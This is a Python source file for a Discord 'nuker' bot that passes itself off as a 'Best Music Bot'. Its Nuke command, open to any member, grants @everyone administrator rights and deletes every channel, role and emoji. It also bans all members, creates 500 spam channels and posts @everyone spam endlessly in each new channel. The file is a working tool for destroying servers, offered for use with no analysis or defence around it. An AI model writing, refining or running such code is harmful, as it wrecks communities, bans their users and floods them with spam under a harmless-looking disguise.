import discord
from discord.ext import commands
import random
from discord import Permissions
from colorama import Fore, Style
import asyncio
import requests
import keep_alive

token = "your-token"


SPAM_CHANNEL =  ["᲼᲼᲼᲼᲼᲼᲼"]
SPAM_MESSAGE = ["@everyone Nuked By https://cdn.discordapp.com/attachments/829947965145612348/934041354626039808/HfqacuRXtgR8Rfh3zE2m24yTCc2kt42dwspiwff1px4.png"]

client = commands.Bot(command_prefix="!")

keep_alive.keep_alive() 

@client.event
async def on_ready():
   print(f'''{Fore.CYAN}

███╗░░██╗██╗░░░██╗██╗░░██╗███████╗██████╗░  ██████╗░██╗░░░██╗
████╗░██║██║░░░██║██║░██╔╝██╔════╝██╔══██╗  ██╔══██╗╚██╗░██╔╝
██╔██╗██║██║░░░██║█████═╝░█████╗░░██║░░██║  ██████╦╝░╚████╔╝░
██║╚████║██║░░░██║██╔═██╗░██╔══╝░░██║░░██║  ██╔══██╗░░╚██╔╝░░
██║░╚███║╚██████╔╝██║░╚██╗███████╗██████╔╝  ██████╦╝░░░██║░░░
╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝╚══════╝╚═════╝░  ╚═════╝░░░░╚═╝░░░

██╗░░██╗██╗██╗░░░░░██╗░░░░░███████╗██████╗░███████╗██╗░░██╗
██║░██╔╝██║██║░░░░░██║░░░░░██╔════╝██╔══██╗██╔════╝██║░██╔╝
█████═╝░██║██║░░░░░██║░░░░░█████╗░░██████╔╝█████╗░░█████═╝░
██╔═██╗░██║██║░░░░░██║░░░░░██╔══╝░░██╔══██╗██╔══╝░░██╔═██╗░
██║░╚██╗██║███████╗███████╗███████╗██║░░██║███████╗██║░╚██╗
╚═╝░░╚═╝╚═╝╚══════╝╚══════╝╚══════╝╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝
 ''')
   await client.change_presence(activity=discord.Game(name= "Best Music Bot"))

@client.command()
@commands.is_owner()
async def Stop(ctx):
    await ctx.bot.logout()
    print (Fore.GREEN + f"{client.user.name} has logged out successfully." + Fore.RESET)

@client.command()
async def Nuke(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    try:
      role = discord.utils.get(guild.roles, name = "@everyone")
      await role.edit(permissions = Permissions.all())
      print(Fore.MAGENTA + "I have given everyone admin." + Fore.RESET)
    except:
      print(Fore.GREEN + "I was unable to give everyone admin" + Fore.RESET)
    for channel in guild.channels:
      try:
        await channel.delete()
        print(Fore.MAGENTA + f"{channel.name} was deleted." + Fore.RESET)
      except:
        print(Fore.GREEN + f"{channel.name} was NOT deleted." + Fore.RESET)
    for member in guild.members:
     try:
       await member.ban()
       print(Fore.MAGENTA + f"{member.name}#{member.discriminator} Was banned" + Fore.RESET)
     except:
       print(Fore.GREEN + f"{member.name}#{member.discriminator} Was unable to be banned." + Fore.RESET)
    for role in guild.roles:
     try:
       await role.delete()
       print(Fore.MAGENTA + f"{role.name} Has been deleted" + Fore.RESET)
     except:
       print(Fore.GREEN + f"{role.name} Has not been deleted" + Fore.RESET)
    for emoji in list(ctx.guild.emojis):
     try:
       await emoji.delete()
       print(Fore.MAGENTA + f"{emoji.name} Was deleted" + Fore.RESET)
     except:
       print(Fore.GREEN + f"{emoji.name} Wasn't Deleted" + Fore.RESET)
    banned_users = await guild.bans()
    for ban_entry in banned_users:
      user = ban_entry.user
      try:
        await user.unban("698969927985397810")
        print(Fore.MAGENTA + f"{user.name}#{user.discriminator} Was successfully unbanned." + Fore.RESET)
      except:
        print(Fore.GREEN + f"{user.name}#{user.discriminator} Was not unbanned." + Fore.RESET)
    await guild.create_text_channel("Idk big dick")
    for channel in guild.text_channels:
        link = await channel.create_invite(max_age = 0, max_uses = 0)
        print(f"New Invite: {link}")
    amount = 500
    for i in range(amount):
       await guild.create_text_channel(random.choice(SPAM_CHANNEL))
    print(f"nuked {guild.name} Successfully.")
    return

@client.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send(random.choice(SPAM_MESSAGE))

client.run(token, bot=True)
